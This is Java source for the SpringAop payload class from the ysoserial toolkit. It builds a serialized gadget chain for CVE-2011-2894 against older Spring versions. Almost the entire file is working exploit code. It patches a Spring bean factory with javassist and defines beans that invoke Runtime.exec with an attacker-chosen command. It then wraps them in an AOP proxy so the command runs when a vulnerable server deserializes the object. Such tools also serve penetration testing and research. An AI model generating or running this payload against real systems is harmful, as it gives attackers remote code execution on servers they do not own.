package ysoserial.payloads;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.LoaderClassPath;
import javassist.SerialVersionUID;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.framework.DefaultAopProxyFactory;
import org.springframework.aop.target.SimpleBeanTargetSource;
import org.springframework.beans.factory.config.BeanDefinition;
import org.springframework.beans.factory.config.MethodInvokingFactoryBean;
import org.springframework.beans.factory.support.DefaultListableBeanFactory;
import org.springframework.beans.factory.support.GenericBeanDefinition;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.PrintUtil;
import ysoserial.payloads.util.Reflections;

import java.io.NotSerializableException;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Collections;
import java.util.List;

/**
 * This is a gadget that work on an older version of Spring (compare to Spring1 gadget).
 *
 * The gadget was created Alvaro Muñoz (@pwntester) (CVE-2011-2894)
 *
 * http://www.pwntester.com/blog/2013/12/16/cve-2011-2894-deserialization-spring-rce/
 */
@SuppressWarnings({"restriction", "rawtypes"})
@Dependencies({"org.springframework:spring-core:3.0.5.RELEASE","org.springframework:spring-beans:3.0.5.RELEASE","org.springframework:spring-aop:3.0.5.RELEASE"})
public class SpringAop extends PayloadRunner implements ObjectPayload<Object> {

    private static boolean DEBUG = false;

    public Object getObject(final String command) throws Exception {
        if(DEBUG) System.out.println("[+] Getting a DefaultListableBeanFactory modified so it has no writeReplace() method");

        Object instrumentedFactory = null;
        ClassPool pool = ClassPool.getDefault();
        try {
            pool.appendClassPath(new LoaderClassPath(BeanDefinition.class.getClassLoader()));
            CtClass instrumentedClass = pool.get("org.springframework.beans.factory.support.DefaultListableBeanFactory");
            // Call setSerialVersionUID before modifying a class to maintain serialization compatability.
            SerialVersionUID.setSerialVersionUID(instrumentedClass);
            CtMethod method = instrumentedClass.getDeclaredMethod("writeReplace");
            //method.insertBefore("{ System.out.println(\"TESTING\"); }");
            method.setName("writeReplaceDisabled");
            Class instrumentedFactoryClass = instrumentedClass.toClass();
            instrumentedFactory = instrumentedFactoryClass.newInstance();
        } catch (Exception e) {
            e.printStackTrace();
        }
        // Modified BeanFactory
        DefaultListableBeanFactory beanFactory = (DefaultListableBeanFactory) instrumentedFactory;

        // Create malicious bean definition programatically
        if(DEBUG) System.out.println("[+] Creating malicious bean definition programatically");

        // First we will set up a bean created with a factory method (instead of using the constructor) that will return a java.lang.Runtime
        // Runtime or ProcessBuilder are not serializable so we cannot use them for the MethodInvokingFactory targetObject, but we can use a bean definition instead that wraps
        // these objects as the server will instantiate them
        GenericBeanDefinition runtime = new GenericBeanDefinition();
        runtime.setBeanClass(Runtime.class);
        runtime.setFactoryMethodName("getRuntime"); // Factory Method needs to be static

        // Exploit bean to be registered in the bean factory as the target source
        GenericBeanDefinition payload = new GenericBeanDefinition();
        // use MethodInvokingFactoryBean instead of factorymethod because we need to pass arguments,
        // and can't do that with the unserializable ConstructorArgumentValues
        payload.setBeanClass(MethodInvokingFactoryBean.class);
        payload.setScope("prototype");
        payload.getPropertyValues()
                .add("targetObject", runtime)
                .add("targetMethod", "exec")
                .add("arguments", Collections.singletonList(command));

        beanFactory.registerBeanDefinition("exploit", payload);


        // Preparing BeanFactory to be serialized
        if(DEBUG) System.out.println("[+] Preparing BeanFactory to be serialized");

        if(DEBUG) System.out.println("[+] Nullifying non-serializable members");
        Reflections.setFieldValue(payload, "constructorArgumentValues", null);

        if(DEBUG) System.out.println("[+] payload BeanDefinition constructorArgumentValues property should be null: " + payload.getConstructorArgumentValues());
        Reflections.setFieldValue(payload, "methodOverrides", null);

        if(DEBUG) System.out.println("[+] payload BeanDefinition methodOverrides property should be null: " + payload.getMethodOverrides());
        Reflections.setFieldValue(runtime, "constructorArgumentValues", null);

        if(DEBUG) System.out.println("[+] runtime BeanDefinition constructorArgumentValues property should be null: " + runtime.getConstructorArgumentValues());
        Reflections.setFieldValue(runtime, "methodOverrides", null);

        if(DEBUG) System.out.println("[+] runtime BeanDefinition methodOverrides property should be null: " + runtime.getMethodOverrides());

        Reflections.setFieldValue(beanFactory, "autowireCandidateResolver", null);

        if(DEBUG) System.out.println("[+] BeanFactory autowireCandidateResolver property should be null: " + beanFactory.getAutowireCandidateResolver());


        // AbstractBeanFactoryBasedTargetSource
        if(DEBUG) System.out.println("[+] Creating a TargetSource for our handler, all hooked calls will be delivered to our malicious bean provided by our factory");
        SimpleBeanTargetSource targetSource = new SimpleBeanTargetSource();
        targetSource.setTargetBeanName("exploit");
        targetSource.setBeanFactory(beanFactory);

        // JdkDynamicAopProxy (InvocationHandler)
        System.out.println("[+] Creating the handler and configuring the target source pointing to our malicious bean factory");
        AdvisedSupport config = new AdvisedSupport();
        config.addInterface(List.class); // So that the factory returns a JDK dynamic proxy
        config.setTargetSource(targetSource);
        DefaultAopProxyFactory handlerFactory = new DefaultAopProxyFactory();
        InvocationHandler handler = (InvocationHandler) handlerFactory.createAopProxy(config);

        // Proxy
        System.out.println("[+] Creating a Proxy implementing the server side expected interface (Contact) with our malicious handler");
        List proxy = (List) Proxy.newProxyInstance(getClass().getClassLoader(), new Class<?>[] { List.class }, handler);

        PrintUtil.printObject(proxy);
        return proxy;
    }

    /**
     * The deserialization will failed on this project. But a remote server with Spring version < 3.0.5 should execute
     * successfully the payload.
     * @param args
     * @throws Exception
     */
    public static void main(final String[] args) throws Exception {

        try {
            PayloadRunner.run(SpringAop.class, args);
        }
        catch (NotSerializableException e) {
            System.err.println("Unable to generate the payload.");
            System.err.println("/!\\ The spring version must be set to 3.0.5.RELEASE to generate this payload.");
        }
    }
}
